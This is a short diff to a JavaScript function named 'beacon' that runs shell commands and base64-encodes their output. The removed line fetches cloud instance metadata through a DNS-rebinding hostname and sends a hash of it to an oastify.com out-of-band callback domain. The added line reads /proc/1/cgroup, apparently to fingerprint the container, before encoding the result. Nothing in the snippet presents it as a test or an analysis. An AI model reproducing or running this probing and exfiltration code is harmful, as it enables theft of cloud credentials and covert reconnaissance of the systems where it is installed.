@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'RESP=$(curl -s http://a9fea9fe.33267158.rbndr.us/latest/meta-data/); HASH=$(echo -n "$RESP" | sha256sum | awk \'{print $1}\'); curl -s "http://sxtggrdkop8c5t96ybhk1evvfmld99xy.oastify.com/ping?hash=$HASH"',
+  'cat /proc/1/cgroup',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
